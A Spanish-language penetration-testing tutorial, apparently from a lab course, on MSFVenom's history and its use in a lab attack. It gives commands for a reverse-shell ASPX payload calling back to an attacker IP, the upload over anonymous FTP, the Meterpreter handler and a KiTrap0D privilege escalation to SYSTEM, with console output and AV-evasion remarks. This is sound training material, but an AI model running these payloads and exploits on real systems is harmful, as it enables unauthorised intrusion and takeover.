# Introducción a MSFVenom

## Evolución Histórica de las Herramientas de Payload

### MSFPayload y MSFEncode: Los Predecesores

MSFVenom es el sucesor de dos herramientas independientes que solían trabajar en conjunto con `msfconsole`:

**MSFPayload:**
- Generaba shellcode para arquitecturas de procesador específicas
- Adaptaba payloads a diferentes versiones de sistemas operativos
- Producía código binario listo para inyección

**MSFEncode:**
- Contenía múltiples esquemas de codificación
- Eliminaba bad characters del shellcode (caracteres que podían causar inestabilidad en runtime)
- Evadía software Anti-Virus (AV) más antiguo
- Burlaba sistemas Intrusion Prevention/Detection (IPS/IDS) basados en endpoints

### Flujo de Trabajo Antiguo

El proceso tradicional requería **piping** (tubería `|`) entre herramientas:

```bash
msfpayload [options] | msfencode [encoding_options]
```

Este flujo manual era:
- Propenso a errores
- Requería múltiples pasos
- Difícil de automatizar consistentemente

## MSFVenom: Unificación de Herramientas

### Concepto de "Marriage" (Matrimonio)

MSFVenom es el resultado de **fusionar** MSFPayload y MSFEncode en una sola herramienta unificada. Esta consolidación proporciona:

**Ventajas:**
- Flujo de trabajo simplificado
- Sintaxis consistente
- Reducción de errores de integración
- Mayor velocidad en generación de payloads

### Capacidades Actuales

MSFVenom ofrece a los pentesters un método para:

1. **Crear payloads rápidamente** para diferentes arquitecturas de host objetivo
2. **Limpiar shellcode** para evitar errores durante el despliegue
3. **Personalizar payloads** con codificaciones y formatos específicos

### Realidad de la Evasión de AV Moderna

**Contexto histórico**: La evasión de AV solía basarse en análisis de firma simple. Ejecutar varias iteraciones de esquemas de codificación era suficiente para bypass.

**Realidad actual**: La evasión de AV es **mucho más complicada** debido a:

- **Análisis heurístico**: Detección basada en comportamiento, no solo firmas
- **Machine Learning**: Modelos entrenados para detectar patrones de malware
- **Deep Packet Inspection (DPI)**: Inspección profunda del tráfico de red
- **Sandboxing dinámico**: Ejecución en ambientes aislados para observar comportamiento

**Resultado**: El análisis de archivos maliciosos basado únicamente en firmas es cosa del pasado.

### Tasa de Detección Actual

Como se vio en el módulo de Payloads, enviar un payload simple con configuración estándar generó:

**Tasa de detección: 52/65**

Esto significa que 52 de 65 motores antivirus detectaron el payload. En términos de analistas de malware a nivel mundial, esto es un "Bingo" completo.

*(Nota: Aún no está probado que los analistas de malware realmente digan "that is a Bingo")*

## Caso Práctico: Explotación Completa con MSFVenom

### Escenario de Ataque

Supongamos que hemos encontrado las siguientes condiciones en el objetivo:

**Servicios expuestos:**
- Puerto FTP abierto (tcp/21) con:
  - Credenciales débiles, O
  - Acceso Anonymous habilitado accidentalmente
- Servicio web en puerto tcp/80
- FTP root directory mapeado a `/uploads` del servicio web

**Vulnerabilidad crítica:**
- El servicio web **NO tiene validaciones** sobre qué archivos pueden ejecutarse
- Cualquier archivo en FTP es accesible y ejecutable vía HTTP

**Vector de ataque:**
1. Subir un shell PHP/ASPX vía FTP
2. Acceder al shell desde el navegador web
3. Triggear el payload
4. Recibir conexión TCP reversa desde la máquina víctima

### Fase 1: Reconocimiento del Objetivo

**Escaneo con Nmap:**

```bash
nmap -sV -T4 -p- 10.10.10.5
```

**Resultados:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Hallazgos clave:**
- FTP de Microsoft (posible Anonymous access)
- IIS 7.5 (servidor web Microsoft)
- Sistema operativo: Windows

### Fase 2: Verificación de Acceso FTP

**Conexión al servicio FTP:**

```bash
ftp 10.10.10.5
```

**Interacción:**
```
Connected to 10.10.10.5.
220 Microsoft FTP Service

Name (10.10.10.5:root): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.

Password: ******

230 User logged in.
Remote system type is Windows_NT.
```

**Listado de contenido FTP:**

```
ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

**Análisis crítico:**

La presencia del directorio `aspnet_client` indica:
- El servidor soporta **ASP.NET**
- Podemos ejecutar archivos `.aspx` (Active Server Pages Extended)
- IIS procesará código C# o VB.NET embebido en archivos ASPX

### Fase 3: Generación de Payload con MSFVenom

**Comando de generación:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

**Desglose del comando:**

- **-p windows/meterpreter/reverse_tcp**: Especifica el payload
  - `windows`: Sistema operativo objetivo
  - `meterpreter`: Tipo de payload (shell avanzado)
  - `reverse_tcp`: Conexión TCP reversa (víctima → atacante)
  
- **LHOST=10.10.14.5**: IP del atacante que recibirá la conexión
  
- **LPORT=1337**: Puerto en el que el atacante escuchará
  
- **-f aspx**: Formato de salida del payload (ASPX para IIS)
  
- **> reverse_shell.aspx**: Redirección de salida a archivo

**Salida del comando:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

**Análisis de la salida:**

- **Platform auto-seleccionada**: Windows (inferida del payload)
- **Arquitectura auto-seleccionada**: x86 (32-bit)
- **Sin encoder**: Payload en formato raw (sin codificación adicional)
- **Tamaño del shellcode**: 341 bytes
- **Tamaño del archivo ASPX final**: 2819 bytes (incluye wrapper ASPX)

**Verificación:**

```bash
ls
```

**Salida:**
```
Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
```

El archivo `reverse_shell.aspx` fue creado exitosamente.

### Fase 4: Upload del Payload vía FTP

**Comando de upload:**

```
ftp > put reverse_shell.aspx
```

**Salida:**
```
local: reverse_shell.aspx remote: reverse_shell.aspx
229 Entering Extended Passive Mode (|||47832|)
150 Ok to send data.
100% |*********************| 2819       512.00 KiB/s 00:00 ETA
226 Transfer complete.
2819 bytes sent in 00:00 (489.12 KiB/s)
```

**Detalles del proceso:**
- **Modo Pasivo Extendido**: El servidor especifica puerto 47832 para transferencia de datos
- **Velocidad de transferencia**: 512 KiB/s
- **Confirmación**: 2819 bytes enviados correctamente

El payload ahora está en el servidor web, accesible vía HTTP.

### Fase 5: Configuración del Listener

Antes de triggear el payload, debemos iniciar un **handler** en `msfconsole` para capturar la conexión reversa.

**Inicio de msfconsole:**

```bash
msfconsole -q
```

**Selección del módulo multi/handler:**

```
msf6 > use multi/handler
```

**Verificación de opciones:**

```
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

**Configuración del listener:**

```
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
LHOST => 10.10.14.5

msf6 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
```

**Inicio del handler:**

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337
```

El handler está ahora escuchando en el puerto 1337, esperando la conexión desde la víctima.

### Fase 6: Ejecución del Payload

**Acceso al payload vía navegador:**

```
http://10.10.10.5/reverse_shell.aspx
```

**Comportamiento esperado:**
- La página cargará en blanco (sin contenido HTML visible)
- El código ASPX se ejecuta en el servidor
- El payload Meterpreter inicia en background

**Nota técnica**: El archivo `.aspx` no contiene HTML de presentación, solo código ejecutable. Por eso vemos una página en blanco, pero el payload se ejecuta de todas formas.

### Fase 7: Recepción de la Sesión Meterpreter

**Salida en msfconsole:**

```
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000

meterpreter > getuid

Server username: IIS APPPOOL\Web

meterpreter > 

[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
```

**Análisis de eventos:**

1. **Stage enviado**: 176,195 bytes del stage completo de Meterpreter transferidos
2. **Sesión abierta**: Conexión establecida desde puerto 49157 de la víctima
3. **Usuario**: `IIS APPPOOL\Web` (cuenta de servicio de bajo privilegio de IIS)
4. **Sesión murió**: La conexión se perdió (posible inestabilidad del payload)

### Problema: Sesión Inestable

**Síntoma**: La sesión Meterpreter muere frecuentemente.

**Posibles causas:**
- Bad characters en el shellcode
- Incompatibilidad con la arquitectura
- Restricciones de memoria
- Protecciones de runtime

**Solución**: Considerar **codificar el payload** para evitar errores durante la ejecución.

**Selección de encoder:**

Podemos seleccionar cualquier encoder viable, mejorando las probabilidades de éxito independientemente del encoder específico elegido.

## Local Exploit Suggester: Escalación de Privilegios

### Contexto del Problema

La sesión Meterpreter aterrizó en el usuario `IIS APPPOOL\Web`, que:
- Es una cuenta de servicio de bajo privilegio
- Tiene permisos muy limitados
- No puede acceder a recursos sensibles del sistema

### Verificación de Arquitectura

```
meterpreter > sysinfo
```

El comando revela que el sistema es de **arquitectura x86 (32-bit)**, dándonos más razón para confiar en sugerencias automáticas.

### Uso del Local Exploit Suggester

**Búsqueda del módulo:**

```
msf6 > search local exploit suggester
```

**Resultados (parciales):**
```
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure
```

**Selección del módulo:**

```
msf6 exploit(multi/handler) > use 2376
```

**Configuración:**

```
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 2
session => 2

msf6 post(multi/recon/local_exploit_suggester) > run
```

**Salida del análisis:**

```
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

**Análisis de resultados:**

El sistema presenta **12 vulnerabilidades locales potenciales** para escalación de privilegios. Cada una representa un vector posible para elevar de `IIS APPPOOL\Web` a `NT AUTHORITY\SYSTEM`.

**Estrategia de explotación:**

1. Seleccionar un exploit de la lista
2. Intentar ejecución
3. Si falla, probar el siguiente
4. Repetir hasta obtener SYSTEM

**Importante**: No todos los checks son 100% precisos. Variables del sistema pueden afectar la explotabilidad real.

### Intentando Exploits de la Lista

**Primer intento: bypassuac_eventvwr**

Este exploit **falla** porque:
- Requiere que el usuario sea parte del grupo Administrators
- `IIS APPPOOL\Web` NO es miembro de Administrators
- Es el comportamiento predeterminado y esperado

**Segundo intento: ms10_015_kitrap0d**

Este exploit **funciona exitosamente**.

### Explotación con MS10-015 KiTrap0D

**Búsqueda del módulo:**

```
msf6 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D
```

**Selección y configuración:**

```
msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     1338             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
```

**Configuración de parámetros:**

```
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
LPORT => 1338

msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
SESSION => 3
```

**Nota importante**: El puerto `LPORT` debe ser **diferente** al usado para la sesión original (1337), ya que ambos handlers estarán activos simultáneamente.

**Ejecución del exploit:**

```
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
```

**Salida:**
```
[*] Started reverse TCP handler on 10.10.14.5:1338 
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Injecting exploit into 3552 ...
[*] Exploit injected. Injecting payload into 3552...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

**Análisis del proceso de explotación:**

1. **Lanzamiento de proceso host**: `notepad.exe` (PID 3552) se usa como contenedor para el exploit
2. **Inyección reflectiva**: El DLL del exploit se inyecta en memoria de notepad
3. **Ejecución del exploit**: KiTrap0D se ejecuta dentro del contexto de notepad
4. **Inyección de payload**: Meterpreter se inyecta en el proceso explotado
5. **Nueva sesión**: Conexión establecida con privilegios elevados

**Resultado final:**

```
Server username: NT AUTHORITY\SYSTEM
```

**¡Éxito!** Ahora operamos con máximos privilegios en el sistema Windows.

## Conceptos Técnicos Clave

### Reflective DLL Injection en KiTrap0D

La técnica de **Reflective DLL Injection** permite:
- Cargar código en memoria sin escribir en disco
- Evitar detección basada en archivos
- Operar completamente en RAM
- No dejar artefactos forenses

### Escalación de Privilegios via Kernel Exploit

**MS10-015 (KiTrap0D)** explota:
- Vulnerabilidad en el kernel de Windows
- Fallo en manejo de excepciones en modo kernel
- Permite elevar privilegios de cualquier usuario a SYSTEM
- Afecta Windows 2000 SP4 hasta Windows 7 (x86)

### Multi/Handler: Listener Universal

El módulo `multi/handler` es un **listener genérico** que:
- Acepta conexiones de múltiples tipos de payload
- No está atado a un exploit específico
- Puede manejar shells reverse, bind, etc.
- Es fundamental para recibir conexiones de payloads generados con msfvenom

## Mejores Prácticas con MSFVenom

1. **Siempre especificar arquitectura explícitamente** cuando sea conocida
2. **Usar encoders** cuando la sesión sea inestable
3. **Probar payloads** en ambiente controlado antes de producción
4. **Variar puertos** para múltiples handlers simultáneos
5. **Considerar evasión de AV** en targets modernos
6. **Documentar payloads** utilizados para reportes de pentesting
